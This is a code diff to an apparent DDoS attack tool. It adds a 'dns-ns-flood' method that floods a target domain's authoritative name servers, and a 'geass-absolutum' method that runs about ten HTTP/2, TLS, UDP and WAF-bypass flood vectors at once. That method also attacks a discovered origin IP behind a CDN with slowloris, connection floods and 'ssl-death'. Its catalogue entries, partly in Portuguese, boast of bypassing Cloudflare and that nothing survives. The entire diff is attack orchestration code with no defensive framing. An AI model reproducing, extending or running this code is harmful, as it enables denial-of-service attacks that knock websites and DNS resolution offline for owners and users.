@@ -435,6 +435,8 @@ const HTTP_PROXY_METHODS = new Set([
   "geass-ultima",
   // CDN bypass — needs proxy rotation for both origin and CDN attacks
   "origin-bypass",
+  "dns-ns-flood",
+  "geass-absolutum",
 ]);
 
 // ── Cloudflare IP range check (for origin-bypass auto-discovery) ──────────
@@ -1009,8 +1011,93 @@ async function runAttackWorkers(
   }
 
   // ─────────────────────────────────────────────────────────────────────────
-  //  GEASS ULTIMA — Final Form: 9 simultaneous vectors across every OSI layer
-  //  Each worker independently runs all 9 vectors → CPU_COUNT × 9 vectors total
+  //  DNS NS FLOOD — Direct authoritative NS server attack
+  //  Bypasses CDN/WAF entirely. Resolves NS records, floods each NS IP with
+  //  A+MX+TXT+SOA random-label queries. Destroys DNS resolution for target domain.
+  // ─────────────────────────────────────────────────────────────────────────
+  if (method === "dns-ns-flood") {
+    await spawnPool("dns-ns-flood", target, port, threads, 1, signal, onStats);
+    return;
+  }
+
+  // ─────────────────────────────────────────────────────────────────────────
+  //  GEASS ABSOLUTUM ∞ — Maximum force: 3 simultaneous fronts
+  //  Front A (CDN/Host): All 10 geass-ultima vectors (H2+TLS+WAF+DNS+UDP)
+  //  Front B (Origin):   Direct origin IP attack if discovered (bypasses CDN)
+  //  Front C (DNS):      NS flood kills domain resolution for everyone
+  // ─────────────────────────────────────────────────────────────────────────
+  if (method === "geass-absolutum") {
+    const hostname_ab = target.replace(/^https?:\/\//i, "").split("/")[0].split(":")[0];
+
+    // Start DNS NS flood and origin discovery in parallel (non-blocking)
+    const cdnIPs_ab  = await dnsP.resolve4(hostname_ab).catch(() => [] as string[]);
+    const originIP_ab = await _findOriginIPForAttack(hostname_ab, cdnIPs_ab).catch(() => null);
+
+    if (originIP_ab) {
+      console.log(`[geass-absolutum] ✓ Origin: ${originIP_ab} — 3-front attack`);
+    } else {
+      console.log(`[geass-absolutum] ✗ Origin not found — 2-front attack (CDN + DNS NS)`);
+    }
+
+    // Thread allocation across fronts
+    const dnsT_ab    = Math.max(50,  Math.round(threads * 0.04));  // DNS NS (small — UDP is cheap)
+    const originT_ab = originIP_ab ? Math.max(200, Math.round(threads * 0.25)) : 0;
+    const cdnT_ab    = threads - dnsT_ab - originT_ab;             // Rest to CDN/host
+
+    const rrW    = Math.max(4, CPU_COUNT);
+    const wafW   = Math.max(4, Math.floor(CPU_COUNT / 2) + 2);
+    const h2W    = Math.max(4, CPU_COUNT);
+    const appW   = Math.max(4, Math.floor(CPU_COUNT / 2) + 2);
+    const pipeW  = Math.max(4, CPU_COUNT);
+
+    const rrT_ab   = Math.max(600,  Math.round(cdnT_ab * 0.55));
+    const wafT_ab  = Math.max(500,  Math.round(cdnT_ab * 0.45));
+    const h2T_ab   = Math.max(600,  Math.round(cdnT_ab * 0.50));
+    const appT_ab  = Math.max(400,  Math.round(cdnT_ab * 0.35));
+    const tlsT_ab  = Math.max(150,  Math.round(cdnT_ab * 0.10));
+    const connT_ab = Math.max(200,  Math.round(cdnT_ab * 0.12));
+    const pipeT_ab = Math.max(1000, Math.round(cdnT_ab * 0.70));
+    const sseT_ab  = Math.max(80,   Math.round(cdnT_ab * 0.06));
+    const udpT_ab  = Math.max(100,  Math.round(cdnT_ab * 0.08));
+
+    const allFronts: Promise<void>[] = [
+      // ── Front A: CDN/Host — all 10 geass-ultima vectors ──────────────────
+      spawnPool("rapid-reset",         target, port, rrT_ab,   rrW,   signal, onStats),
+      spawnPool("waf-bypass",          target, port, wafT_ab,  wafW,  signal, onStats),
+      spawnPool("h2-storm",            target, port, h2T_ab,   h2W,   signal, onStats),
+      spawnPool("app-smart-flood",     target, port, appT_ab,  appW,  signal, onStats),
+      spawnPool("tls-session-exhaust", target, port, tlsT_ab,  1,     signal, onStats),
+      spawnPool("conn-flood",          target, port, connT_ab, 1,     signal, onStats),
+      spawnPool("http-pipeline",       target, port, pipeT_ab, pipeW, signal, onStats),
+      spawnPool("sse-exhaust",         target, port, sseT_ab,  1,     signal, onStats),
+      spawnPool("udp-flood",           target, port, udpT_ab,  1,     signal, onStats),
+      // ── Front C: DNS NS destruction ───────────────────────────────────────
+      spawnPool("dns-ns-flood",        target, port, dnsT_ab,  1,     signal, onStats),
+    ];
+
+    if (originIP_ab) {
+      // ── Front B: Direct origin IP attack (bypasses CDN entirely) ──────────
+      const pT = Math.ceil(originT_ab * 0.30);
+      const cT = Math.ceil(originT_ab * 0.20);
+      const rT = Math.ceil(originT_ab * 0.20);
+      const sT = Math.ceil(originT_ab * 0.15);
+      const xT = Math.max(50, originT_ab - pT - cT - rT - sT);
+      allFronts.push(
+        spawnPool("http-pipeline", originIP_ab, 80,  pT, Math.max(4, CPU_COUNT), signal, onStats, undefined, hostname_ab),
+        spawnPool("conn-flood",    originIP_ab, 443, cT, 1,                       signal, onStats, undefined, hostname_ab),
+        spawnPool("h2-rst-burst",  originIP_ab, 443, rT, Math.max(4, CPU_COUNT), signal, onStats, undefined, hostname_ab),
+        spawnPool("slowloris",     originIP_ab, 80,  sT, 1,                       signal, onStats, undefined, hostname_ab),
+        spawnPool("ssl-death",     originIP_ab, 443, xT, 2,                       signal, onStats, undefined, hostname_ab),
+      );
+    }
+
+    await Promise.all(allFronts);
+    return;
+  }
+
+  // ─────────────────────────────────────────────────────────────────────────
+  //  GEASS ULTIMA — Final Form: 10 simultaneous vectors across every OSI layer
+  //  Each worker independently runs all 10 vectors → CPU_COUNT × 10 vectors total
   // ─────────────────────────────────────────────────────────────────────────
   if (method === "geass-ultima") {
     // Socket-holding vectors → 1 worker; stateless vectors → scale with CPU_COUNT
@@ -1034,16 +1121,19 @@ async function runAttackWorkers(
     const sseT   = Math.max(100,  Math.round(threads * 0.08)); // SSE Exhaust
     const udpT   = Math.max(200,  Math.round(threads * 0.10)); // UDP Flood
 
+    const dnsNsT = Math.max(50, Math.round(threads * 0.04)); // DNS NS Flood [V10]
+
     await Promise.all([
-      spawnPool("rapid-reset",        target, port, rrT,   rrW,   signal, onStats),
-      spawnPool("waf-bypass",         target, port, wafT,  wafW,  signal, onStats),
-      spawnPool("h2-storm",           target, port, h2T,   h2W,   signal, onStats),
-      spawnPool("app-smart-flood",    target, port, appT,  appW,  signal, onStats),
-      spawnPool("tls-session-exhaust",target, port, tlsT,  tlsW,  signal, onStats),
-      spawnPool("conn-flood",         target, port, connT, connW, signal, onStats),
-      spawnPool("http-pipeline",      target, port, pipeT, pipeW, signal, onStats),
-      spawnPool("sse-exhaust",        target, port, sseT,  sseW,  signal, onStats),
-      spawnPool("udp-flood",          target, port, udpT,  udpW,  signal, onStats),
+      spawnPool("rapid-reset",        target, port, rrT,    rrW,   signal, onStats),
+      spawnPool("waf-bypass",         target, port, wafT,   wafW,  signal, onStats),
+      spawnPool("h2-storm",           target, port, h2T,    h2W,   signal, onStats),
+      spawnPool("app-smart-flood",    target, port, appT,   appW,  signal, onStats),
+      spawnPool("tls-session-exhaust",target, port, tlsT,   tlsW,  signal, onStats),
+      spawnPool("conn-flood",         target, port, connT,  connW, signal, onStats),
+      spawnPool("http-pipeline",      target, port, pipeT,  pipeW, signal, onStats),
+      spawnPool("sse-exhaust",        target, port, sseT,   sseW,  signal, onStats),
+      spawnPool("udp-flood",          target, port, udpT,   udpW,  signal, onStats),
+      spawnPool("dns-ns-flood",       target, port, dnsNsT, 1,     signal, onStats), // [V10] NS destruction
     ]);
     return;
   }
@@ -1055,8 +1145,10 @@ async function runAttackWorkers(
 // ── Static method catalogue ───────────────────────────────────────────────
 const METHODS_CATALOGUE = [
   // Geass / Special
+  { id: "geass-absolutum",      name: "Geass Absolutum ∞ [3 FRONTES — 15v+]",  layer: "ALL",  protocol: "TCP/UDP/H2/TLS/DNS",   tier: "ARES",   description: "PODER MÁXIMO — 3 frentes simultâneas: [A] CDN/Host: todos 10 vetores do Ultima; [B] Origin IP direto se descoberto (bypassa CDN completamente); [C] DNS NS destruction. Nada sobrevive." },
   { id: "geass-override",       name: "Geass Override ∞ [ARES 42v]",          layer: "ALL",  protocol: "TCP/UDP/H2/H3/TLS",    tier: "ARES",   description: "MAX POWER — 42 simultaneous attack vectors: H3-RapidReset(CVE-44487)+QUIC+H2-RST+H2-CONTINUATION(CVE-27316)+H2-Settings+Pipeline+Slowloris+HPACK+WAF+TLS+WS-Deflate+DNS+gRPC+..." },
-  { id: "geass-ultima",         name: "Geass Ultima ∞ [FINAL FORM — 9v]",      layer: "ALL",  protocol: "TCP/UDP/H2/TLS",       tier: "ARES",   description: "FORMA FINAL — 9 vetores simultâneos em todas as camadas OSI: RapidReset(CVE-44487)+WAFBypass+H2Storm(6v)+AppFlood+TLSExhaust+ConnFlood+Pipeline+SSE+UDP. Zero delay, máximo impacto" },
+  { id: "geass-ultima",         name: "Geass Ultima ∞ [10v — +DNS NS]",        layer: "ALL",  protocol: "TCP/UDP/H2/TLS/DNS",   tier: "ARES",   description: "FORMA FINAL — 10 vetores simultâneos: RapidReset+WAFBypass+H2Storm(6v)+AppFlood+TLSExhaust+ConnFlood+Pipeline+SSE+UDP+DNS-NS. Zero delay, todas as camadas OSI" },
+  { id: "dns-ns-flood",         name: "DNS NS Flood [Authoritative Killer]",   layer: "L3",   protocol: "DNS/UDP",              tier: "S",      description: "Resolve NS autoritativos do domínio e os destroi com A+MX+TXT+SOA queries aleatórias. 500-burst por socket, 3 pools por NS IP, 20% CHAOS class. Bypassa CDN/WAF totalmente." },
   { id: "bypass-storm",         name: "Bypass Storm ∞ (3-Phase Composite)",    layer: "L7",   protocol: "HTTP/2+TLS",           tier: "S",      description: "Phase 1: TLS Exhaust+ConnFlood → Phase 2: WAF Bypass+H2 RST+RapidReset → Phase 3: AppFlood+CacheBust. Fases independentes + RapidReset no Phase 2" },
   { id: "origin-bypass",        name: "CDN Origin Bypass [Dual-Front]",         layer: "ALL",  protocol: "HTTP+TLS+TCP",         tier: "S",      description: "Auto-descobre IP de origem via subdomain enum+IPv6+SPF+MX. Front 1 (70%): ataca origem diretamente (bypassa CDN). Front 2 (30%): cache-poison+waf-bypass esgota CDN edges. Cloudflare torna-se irrelevante." },
   // L7 Application
